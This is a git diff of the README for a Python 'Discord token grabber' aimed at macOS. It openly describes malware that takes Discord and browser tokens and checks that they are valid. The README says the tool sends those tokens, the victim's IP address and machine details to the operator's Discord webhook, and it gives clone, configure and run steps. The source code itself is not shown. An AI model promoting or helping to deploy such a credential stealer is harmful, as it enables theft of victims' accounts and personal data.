@@ -1,7 +1,7 @@
 .![images](https://user-images.githubusercontent.com/100237364/159133466-7eb9a1b6-911c-448e-9dd1-e74842290fc5.jpeg)
 
 Here is a Discord token grabber created in Python,
-This version of the grabber supports windows, mac, and linux operating systems.
+This version of the grabber only support the macos operating system.
 This is my very first Github Project
 
 Liability Disclaimer ⚠
@@ -12,8 +12,23 @@ Creators shall not be liable for any indirect, incidental, special, consequentia
 (i) your access to this resource and/or inability to access this resource
 (ii) any conduct or content of any third party referenced by this resource, including without limitation, any defamatory, offensive or illegal conduct or other users or third parties
 (iii) any content obtained from this resource
+
 Features: ⚙
 Send Informations via discord webhook
 Checks for Discord (Canary, PTB) tokens, Google Chrome, Brave Browser, Yandex Browser and Opera Browser
 Checks whether the token(s) is valid before sending it to avoid disabled tokens
-Available for Macos, Windows, and Linux operating systems
+Sends the ip address of the machine.
+Sends some basic information about the machine.
+Available for the Macos operating system.
+
+Requirements: 💻
+A computer running the Macos operating system.
+Python installed, you can download python from https://python.org
+And a Discord server, with a Discord webhook, you can learn more about webhooks here: https://discord.com/developers/docs/resources/webhook
+
+How to Use: 😀
+Open terminal and paste this: gh repo clone kumarchino/Discord-Mac-Token-Grabber
+Now go to your documents folder and type this: kumarchino/Discord-Mac-Token-Grabber
+When you do this there should be a three files, a license, file a Read.me file and a main.py file
+Open the main.py file in python and change the webhook"urlhere" to a Discord webhook make sure not to remove the parentheses.
+As soon as you finish doing this, you can run the file, there hsould be a Discord token, ip address and some basic information about the machine in your Discord Server.
